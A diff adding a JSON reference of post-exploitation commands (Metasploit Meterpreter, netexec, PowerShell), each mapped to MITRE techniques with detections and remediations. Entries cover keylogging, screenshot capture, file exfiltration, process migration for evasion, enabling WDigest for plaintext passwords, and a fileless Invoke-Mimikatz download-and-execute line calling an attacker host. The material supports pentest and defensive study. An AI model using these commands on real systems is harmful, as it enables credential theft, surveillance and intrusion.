@@ -1,0 +1,397 @@
+[
+  {
+    "id": "meterpreter-screenshot",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux",
+      "windows"
+    ],
+    "command": "meterpreter > screenshot",
+    "name": "Capture Screenshot",
+    "description": "Takes a screenshot of the victim's desktop.",
+    "arguments": {
+      "screenshot": "Capture current screen"
+    },
+    "expected_output": "Screenshot saved to: /tmp/screenshot.jpeg",
+    "use_case": "Capture evidence of user activity or sensitive information on screen.",
+    "prerequisites": [
+      "Active Meterpreter session"
+    ],
+    "mitre_mapping": [
+      "T1113"
+    ],
+    "mitre_tactic": "Collection",
+    "detections": [
+      "Screen capture API calls"
+    ],
+    "remediation": [
+      "Lock screen when away",
+      "DLP"
+    ],
+    "common_mistakes": [
+      "No GUI session active"
+    ],
+    "alternatives": [
+      "meterpreter > screenshare (live)"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "screenshot",
+      "evidence",
+      "desktop",
+      "collection"
+    ]
+  },
+  {
+    "id": "meterpreter-keyscan",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "meterpreter > keyscan_start\n# Wait...\nmeterpreter > keyscan_dump",
+    "name": "Keylogger",
+    "description": "Starts a keylogger to capture typed passwords and sensitive data.",
+    "arguments": {
+      "keyscan_start": "Begin logging",
+      "keyscan_dump": "Show captured keys"
+    },
+    "expected_output": "Keystrokes:\nadmin@corp.com\tP@ssw0rd123\nconfidential project details...",
+    "use_case": "Capture passwords and sensitive information typed by the user.",
+    "prerequisites": [
+      "Meterpreter session",
+      "User actively typing"
+    ],
+    "mitre_mapping": [
+      "T1056.001"
+    ],
+    "mitre_tactic": "Collection",
+    "detections": [
+      "Keylogger API hooks",
+      "Unusual process behavior"
+    ],
+    "remediation": [
+      "EDR",
+      "Secure input fields"
+    ],
+    "common_mistakes": [
+      "No user activity"
+    ],
+    "alternatives": [
+      "manual keylogger binary"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "keylogger",
+      "capture",
+      "passwords",
+      "surveillance"
+    ]
+  },
+  {
+    "id": "meterpreter-download",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux",
+      "windows"
+    ],
+    "command": "meterpreter > download C:\\Users\\admin\\Desktop\\passwords.xlsx",
+    "name": "Download File",
+    "description": "Downloads a file from the compromised system to your machine.",
+    "arguments": {
+      "download": "Transfer file to attacker"
+    },
+    "expected_output": "[*] Downloading: passwords.xlsx\n[*] Downloaded 45.2 KB",
+    "use_case": "Exfiltrate sensitive files from compromised systems.",
+    "prerequisites": [
+      "Meterpreter session",
+      "File path known"
+    ],
+    "mitre_mapping": [
+      "T1005"
+    ],
+    "mitre_tactic": "Collection",
+    "detections": [
+      "File access events",
+      "Data transfer"
+    ],
+    "remediation": [
+      "DLP",
+      "File access monitoring"
+    ],
+    "common_mistakes": [
+      "File doesn't exist"
+    ],
+    "alternatives": [
+      "scp",
+      "netcat file transfer"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "download",
+      "exfiltration",
+      "file",
+      "transfer"
+    ]
+  },
+  {
+    "id": "meterpreter-upload",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux",
+      "windows"
+    ],
+    "command": "meterpreter > upload /tools/mimikatz.exe C:\\temp\\m.exe",
+    "name": "Upload File",
+    "description": "Uploads a file from attacker to the compromised system.",
+    "arguments": {
+      "upload": "Transfer file to target"
+    },
+    "expected_output": "[*] Uploading: mimikatz.exe \u2192 C:\\temp\\m.exe\n[*] Uploaded 1.2 MB",
+    "use_case": "Transfer tools and payloads to compromised systems.",
+    "prerequisites": [
+      "Meterpreter session"
+    ],
+    "mitre_mapping": [
+      "T1105"
+    ],
+    "mitre_tactic": "Command and Control",
+    "detections": [
+      "New file creation",
+      "File write events"
+    ],
+    "remediation": [
+      "Application whitelisting",
+      "Monitor temp directories"
+    ],
+    "common_mistakes": [
+      "AV quarantines uploaded file"
+    ],
+    "alternatives": [
+      "certutil -urlcache",
+      "powershell iwr"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "upload",
+      "transfer",
+      "tools",
+      "delivery"
+    ]
+  },
+  {
+    "id": "meterpreter-sysinfo",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux",
+      "windows"
+    ],
+    "command": "meterpreter > sysinfo",
+    "name": "System Information",
+    "description": "Displays target system information \u2014 OS, architecture, domain, hostname.",
+    "arguments": {
+      "sysinfo": "Get system details"
+    },
+    "expected_output": "Computer: PC01\nOS: Windows 10 (10.0 Build 19045)\nArchitecture: x64\nDomain: CORP\nMeterpreter: x64/windows",
+    "use_case": "Quick system identification after gaining access.",
+    "prerequisites": [
+      "Meterpreter session"
+    ],
+    "mitre_mapping": [
+      "T1082"
+    ],
+    "mitre_tactic": "Discovery",
+    "detections": [
+      "System info queries"
+    ],
+    "remediation": [
+      "N/A"
+    ],
+    "common_mistakes": [
+      "N/A"
+    ],
+    "alternatives": [
+      "systeminfo (cmd)",
+      "uname -a (Linux)"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "sysinfo",
+      "identification",
+      "os",
+      "architecture"
+    ]
+  },
+  {
+    "id": "meterpreter-migrate",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "meterpreter > migrate -N explorer.exe",
+    "name": "Process Migration",
+    "description": "Migrates Meterpreter to another process \u2014 evades detection and gains stability.",
+    "arguments": {
+      "-N explorer.exe": "Migrate to process by name"
+    },
+    "expected_output": "[*] Migrating from 1234 to 5678 (explorer.exe)\n[*] Migration completed successfully",
+    "use_case": "Move to a stable process to avoid detection and survive if original process dies.",
+    "prerequisites": [
+      "Meterpreter session",
+      "Target process accessible"
+    ],
+    "mitre_mapping": [
+      "T1055"
+    ],
+    "mitre_tactic": "Defense Evasion",
+    "detections": [
+      "Process injection events (Sysmon 8)",
+      "Unusual memory allocation"
+    ],
+    "remediation": [
+      "EDR process injection detection",
+      "Protected processes"
+    ],
+    "common_mistakes": [
+      "Insufficient privileges for target process"
+    ],
+    "alternatives": [
+      "manual process injection"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "migrate",
+      "process",
+      "evasion",
+      "stability"
+    ]
+  },
+  {
+    "id": "crackmapexec-wdigest",
+    "tool": "netexec",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "netexec smb <target> -u admin -p pass -M wdigest -o ACTION=enable",
+    "name": "Enable WDigest (Plaintext Passwords)",
+    "description": "Enables WDigest authentication so next logon stores plaintext password in memory.",
+    "arguments": {
+      "-M wdigest": "WDigest module",
+      "ACTION=enable": "Enable plaintext storage"
+    },
+    "expected_output": "[+] WDigest enabled. Next logon will store plaintext credentials.",
+    "use_case": "Enable WDigest so mimikatz can extract plaintext passwords on next login.",
+    "prerequisites": [
+      "Admin access",
+      "Target is Windows"
+    ],
+    "mitre_mapping": [
+      "T1112"
+    ],
+    "mitre_tactic": "Defense Evasion",
+    "detections": [
+      "Registry modification (UseLogonCredential)",
+      "WDigest setting change"
+    ],
+    "remediation": [
+      "Monitor WDigest registry key",
+      "Credential Guard"
+    ],
+    "common_mistakes": [
+      "Credential Guard enabled"
+    ],
+    "alternatives": [
+      "reg add HKLM\\SYSTEM\\...\\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec"
+    ],
+    "tags": [
+      "wdigest",
+      "plaintext",
+      "credentials",
+      "registry"
+    ]
+  },
+  {
+    "id": "invoke-mimikatz",
+    "tool": "powershell",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
+    "name": "Invoke-Mimikatz (Fileless)",
+    "description": "Runs Mimikatz entirely in memory via PowerShell \u2014 no binary on disk.",
+    "arguments": {
+      "IEX": "Invoke-Expression (download and execute)",
+      "Invoke-Mimikatz": "PowerShell mimikatz wrapper"
+    },
+    "expected_output": "Hostname: PC01 / S-1-5-21-...\nmsv:\n Username: admin\n NTLM: fc525c96...",
+    "use_case": "Extract credentials without writing mimikatz.exe to disk \u2014 harder to detect.",
+    "prerequisites": [
+      "PowerShell access",
+      "Admin privileges",
+      "AMSI bypass may be needed"
+    ],
+    "mitre_mapping": [
+      "T1003.001"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "PowerShell script block logging",
+      "AMSI alerts",
+      "Memory-only execution"
+    ],
+    "remediation": [
+      "AMSI",
+      "Constrained Language Mode",
+      "Script block logging"
+    ],
+    "common_mistakes": [
+      "AMSI blocks",
+      "CLM enabled"
+    ],
+    "alternatives": [
+      "pypykatz",
+      "SharpKatz",
+      "nanodump"
+    ],
+    "references": [
+      "https://github.com/PowerShellMafia/PowerSploit"
+    ],
+    "tags": [
+      "mimikatz",
+      "fileless",
+      "powershell",
+      "memory",
+      "credentials"
+    ]
+  }
+]
